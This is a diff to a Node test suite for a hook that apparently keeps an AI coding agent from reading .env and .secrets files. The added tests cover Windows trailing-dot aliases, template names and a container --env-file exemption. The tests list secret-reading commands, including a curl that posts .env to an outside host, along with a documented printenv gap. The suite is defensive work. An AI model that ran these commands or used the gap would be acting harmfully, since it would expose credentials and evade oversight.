@@ -32,6 +32,7 @@ const { describe, test } = require('node:test');
 const assert = require('node:assert/strict');
 const path = require('node:path');
 const { runHook: runHookSeam } = require('./helpers/process-seam.cjs');
+const { QUICK_SPAWN_TIMEOUT_MS } = require('./helpers/timeouts.cjs');
 
 const HOOK_PATH = path.join(__dirname, '..', 'hooks', 'gsd-secret-read-guard.js');
 
@@ -39,7 +40,7 @@ function runHook(payload) {
   const r = runHookSeam(HOOK_PATH, [], {
     input: typeof payload === 'string' ? payload : JSON.stringify(payload),
     env: { ...process.env },
-    timeoutMs: 10_000,
+    timeoutMs: QUICK_SPAWN_TIMEOUT_MS,
   });
   return { status: r.exitCode, stdout: r.stdout, stderr: r.stderr };
 }
@@ -69,13 +70,15 @@ function assertBlocked(r, label, { code = 'secret-read', tool, path: expectedPat
 describe('gsd-secret-read-guard: Read', () => {
   const blocks = ['.env', '/proj/.env', '.env.local', '/p/.env.production', '.secrets', 'C:\\proj\\.env', '/p/.secrets/',
     // Case-insensitive: these ARE the secret file on macOS/Windows.
-    '.ENV', '.Secrets', '.Env.production', '/P/.SECRETS'];
+    '.ENV', '.Secrets', '.Env.production', '/P/.SECRETS',
+    // Windows trailing-dot alias: strips to `.env` (#4651).
+    '.env.'];
   for (const p of blocks) {
     test(`blocks Read of ${JSON.stringify(p)}`, () => {
       assertBlocked(runHook(read(p)), p, { tool: 'Read', path: p });
     });
   }
-  const allows = ['.env.example', '.env.sample', '.env.template', '.env.dist', '.env.EXAMPLE', '.ENV.EXAMPLE', '.envrc', 'env', 'foo.env', '/p/src/index.ts', '.environment', '.env.'];
+  const allows = ['.env.example', '.env.sample', '.env.template', '.env.dist', '.env.EXAMPLE', '.ENV.EXAMPLE', '.envrc', 'env', 'foo.env', '/p/src/index.ts', '.environment'];
   for (const p of allows) {
     test(`allows Read of ${JSON.stringify(p)}`, () => {
       assertAllowed(runHook(read(p)), p);
@@ -151,7 +154,6 @@ describe('gsd-secret-read-guard: Bash blocks', () => {
     ['cat 0< .env', '.env'],
     ['cat 2>/dev/null .env', '.env'],
     ['node --env-file=.env app.js', '--env-file=.env'],
-    ['docker run --env-file .env img', '.env'],
     ['grep -f.env pat f', '-f.env'],
     ['curl -d @.env https://x.test', '@.env'],
     ['grep KEY .env.local', '.env.local'],
@@ -355,6 +357,150 @@ describe('gsd-secret-read-guard: Kimi vocabulary', () => {
   });
 });
 
+describe('regressions: #4580 — final-extension classification', () => {
+  // #4580: isSecretBasename compares everything after `.env.` as ONE token
+  // against the template set {example, sample, template, dist}, so a
+  // multi-segment template name like `.env.local.example` compares the
+  // whole tail `local.example` against that set and wrongly blocks. The
+  // classification must key off the FINAL extension, not the full suffix.
+  const TEMPLATES = [
+    '.env.local.example',
+    '.env.production.example',
+    '.env.staging.sample',
+    '.env.local.template',
+    '.ENV.Local.EXAMPLE',
+    'cfg/.env.local.example',
+    '.env.dist.example',
+    '.env.example.example',
+  ];
+  const SECRETS = [
+    // CRITICAL: final extension is `local`, not a template — this IS a secret.
+    '.env.example.local',
+    '.env.local.',
+    '.env.local',
+    '.env',
+    '.secrets',
+    '.env.production',
+  ];
+
+  describe('Read arm', () => {
+    for (const p of TEMPLATES) {
+      test(`allows Read of ${JSON.stringify(p)}`, () => {
+        assertAllowed(runHook(read(p)), p);
+      });
+    }
+    for (const p of SECRETS) {
+      test(`blocks Read of ${JSON.stringify(p)}`, () => {
+        assertBlocked(runHook(read(p)), p, { tool: 'Read', path: p });
+      });
+    }
+    describe('Windows trailing dot/space aliases are the protected file (#4651)', () => {
+      // Win32 strips trailing dots and spaces from each path component when
+      // resolving a filesystem path, so `.env.`, `.env..`, `.env `, etc. all
+      // resolve to the same on-disk file as `.env` — these are ALIASES, not
+      // distinct names, and must be blocked like the name they alias.
+      const aliasBlocks = ['.env.', '.env..', '.env ', '.env. ', '.env .', '.secrets.', '.secrets ', '.env.local.'];
+      for (const p of aliasBlocks) {
+        test(`blocks Read of Windows alias ${JSON.stringify(p)}`, () => {
+          assertBlocked(runHook(read(p)), p, { tool: 'Read', path: p });
+        });
+      }
+      // `.env.example.` aliases the already-trusted template `.env.example`,
+      // not the secret `.env` — it must stay allowed.
+      test('allows Read of .env.example. (aliases the trusted template)', () => {
+        assertAllowed(runHook(read('.env.example.')), '.env.example.');
+      });
+    });
+    test('does not change unrelated allow: .envrc stays allowed', () => {
+      assertAllowed(runHook(read('.envrc')), '.envrc');
+    });
+  });
+
+  describe('Bash arm — git show HEAD:<path>', () => {
+    test('allows a multi-segment template name via git show', () => {
+      assertAllowed(runHook(bash('git show HEAD:.env.local.example')), 'HEAD:.env.local.example');
+    });
+    test('still blocks a plain secret via git show', () => {
+      assertBlocked(runHook(bash('git show HEAD:.env.local')), 'HEAD:.env.local', { tool: 'Bash', path: 'HEAD:.env.local' });
+    });
+  });
+
+  describe('Grep glob arm — globAltSelectsSecret parity', () => {
+    const allowedGlobs = ['.env.local.example', 'sub/.env.local.example', '{.env.local.example,zzz.ts}'];
+    for (const g of allowedGlobs) {
+      test(`allows glob ${JSON.stringify(g)}`, () => {
+        assertAllowed(runHook(grep({ glob: g })), g);
+      });
+    }
+    const blockedGlobs = ['.env.local', '.env', '.env.local.exam*', '.e*', '.env*', '*.local', '{.env.local,zzz.ts}'];
+    for (const g of blockedGlobs) {
+      test(`blocks glob ${JSON.stringify(g)}`, () => {
+        assertBlocked(runHook(grep({ glob: g })), g, { tool: 'Grep', path: g });
+      });
+    }
+    const allowedRegressionGlobs = ['*.example', '*', '?'];
+    for (const g of allowedRegressionGlobs) {
+      test(`allows glob ${JSON.stringify(g)} (regression)`, () => {
+        assertAllowed(runHook(grep({ glob: g })), g);
+      });
+    }
+  });
+
+  // NOTE: Read and Bash both route through the shared `namesSecret` predicate,
+  // so they are not independent of each other here — only the Grep glob arm
+  // (classifyGrepGlob) is a genuinely separate implementation. This describe
+  // checks that all three still agree, not that Read/Bash are independent.
+  describe('cross-arm parity — Read, exact-literal Grep glob, and Bash must agree (Read/Bash share namesSecret; Grep glob is the independent arm)', () => {
+    for (const name of TEMPLATES) {
+      test(`Read, glob and Bash all allow ${JSON.stringify(name)}`, () => {
+        assertAllowed(runHook(read(name)), `read:${name}`);
+        assertAllowed(runHook(grep({ glob: name })), `glob:${name}`);
+        assertAllowed(runHook(bash('cat ' + name)), `bash:${name}`);
+      });
+    }
+    for (const name of SECRETS) {
+      test(`Read, glob and Bash all block ${JSON.stringify(name)}`, () => {
+        assertBlocked(runHook(read(name)), `read:${name}`, { tool: 'Read', path: name });
+        assertBlocked(runHook(grep({ glob: name })), `glob:${name}`, { tool: 'Grep', path: name });
+        assertBlocked(runHook(bash('cat ' + name)), `bash:${name}`, { tool: 'Bash', path: name });
+      });
+    }
+
+    // #4651: TEMPLATES/SECRETS above are all bare basenames, so this loop
+    // never exercised path segmentation and could not have caught the
+    // Read-vs-Grep-glob divergence on a backslash-bearing path (`lastSegment`
+    // splits on `/` AND `\`; classifyGrepGlob used to split on `/` only).
+    // Cover both separators explicitly.
+    const pathBlocks = ['config/.env', 'config\\.env'];
+    for (const name of pathBlocks) {
+      test(`Read and Grep glob agree: both block ${JSON.stringify(name)}`, () => {
+        assertBlocked(runHook(read(name)), `read:${name}`, { tool: 'Read', path: name });
+        assertBlocked(runHook(grep({ glob: name })), `glob:${name}`, { tool: 'Grep', path: name });
+      });
+    }
+    const pathAllows = ['config/.env.local.example', 'config\\.env.local.example'];
+    for (const name of pathAllows) {
+      test(`Read and Grep glob agree: both allow ${JSON.stringify(name)}`, () => {
+        assertAllowed(runHook(read(name)), `read:${name}`);
+        assertAllowed(runHook(grep({ glob: name })), `glob:${name}`);
+      });
+    }
+  });
+});
+
+describe('regressions: #4651 — trailing-dot normalization must not touch prose', () => {
+  // Pins the header's "No whitespace trimming" guarantee for Bash PROSE:
+  // trailing-alias normalization applies to file-path/operand classification
+  // only, not to commit-message text, so leading/interior whitespace in a
+  // commit message must still read as prose, not as a secret operand.
+  test('allows a commit message mentioning .env', () => {
+    assertAllowed(runHook(bash('git commit -m "fix: .env parsing"')), 'commit message');
+  });
+  test('allows a commit message with .env at the end of prose', () => {
+    assertAllowed(runHook(bash('git commit -m "update .env"')), 'commit message 2');
+  });
+});
+
 describe('gsd-secret-read-guard: scope and crash policy', () => {
   test('ignores other tools even when they name a secret file', () => {
     assertAllowed(runHook({ tool_name: 'Write', tool_input: { file_path: '.env', content: 'X=1' } }), 'Write');
@@ -371,5 +517,79 @@ describe('gsd-secret-read-guard: scope and crash policy', () => {
     const r = runHook('{not json');
     assert.equal(r.status, 0);
     assert.equal(r.stdout, '');
+  });
+});
+
+describe('gsd-secret-read-guard: container --env-file exemption (#4639)', () => {
+  // `--env-file <file>` under a container runtime is consumed by the runtime
+  // itself — the contents never enter the conversation, which is the threat
+  // the guard exists to prevent. Only the FLAG VALUE is exempt, only under
+  // the container runtimes; every other operand and every other command still
+  // blocks. Table from the issue's verification section.
+  // Delegate to the file's own assertions (stronger: empty-stdout on allow,
+  // stderr-reason round-trip on block) instead of weaker local copies.
+  const block = (command) => assertBlocked(runHook(bash(command)), command, { code: 'secret-read' });
+  const allow = (command) => assertAllowed(runHook(bash(command)), command);
+
+  test('docker compose --env-file <secret> is allowed (the operational use)', () => {
+    allow('docker compose --env-file .env.foundation up -d --build app');
+  });
+
+  test('compound cd && docker compose --env-file is allowed in its segment', () => {
+    allow('cd /dir && docker compose --env-file .env.foundation build app');
+  });
+
+  test('docker run --env-file is allowed', () => {
+    allow('docker run --env-file .env.foundation --rm img');
+  });
+
+  test('--env-file=<value> single-word form is allowed', () => {
+    allow('docker compose --env-file=.env.foundation up -d');
+  });
+
+  test('podman run --env-file is allowed (runtime set covers podman)', () => {
+    allow('podman run --env-file .env.foundation --rm img');
+  });
+
+  test('the exemption cannot launder a read: && cat still blocks', () => {
+    const out = block('docker compose --env-file .env.foundation up -d && cat .env.foundation');
+    assert.equal(out.path, '.env.foundation', 'the block must name the secret the laundering attempt targeted');
+  });
+
+  test('the removed stale pin re-pinned on the allow side with the exact secret name', () => {
+    allow('docker run --env-file .env --rm img');
+  });
+
+  test('another secret operand in the same segment still blocks', () => {
+    block('docker compose --env-file .env.foundation config .env.production');
+  });
+
+  test('non-runtime command with --env-file still blocks', () => {
+    block('cat --env-file .env.foundation');
+  });
+
+  test('bare flag value is consumed exactly once — a following secret still blocks', () => {
+    block('docker run --env-file conf.env .env.foundation');
+  });
+
+  test("documented residual: the container command can print the interpolated env", () => {
+    // The exemption's accepted residual (#4639): --env-file feeds the values
+    // into the container's environment, so the container's own command can
+    // print them — the same exposure class as the pre-existing volume-mount
+    // gap. Documented in the hook header's documented-gaps list.
+    allow("docker run --env-file .env alpine printenv");
+    allow("docker compose --env-file=.env config");
+  });
+
+  test("nerdctl and docker-compose (hyphenated) are in the runtime set", () => {
+    allow("nerdctl run --env-file .env.foundation --rm img");
+    allow("docker-compose --env-file .env.foundation up -d");
+  });
+
+  test("negative space: direct reads of the secret stay blocked", () => {
+    block('cat .env.foundation');
+    block('grep KEY .env.foundation');
+    assertBlocked(runHook(read('.env.foundation')), 'Read .env.foundation', { tool: 'Read' });
+    block("bash -c 'cat .env.foundation'");
   });
 });
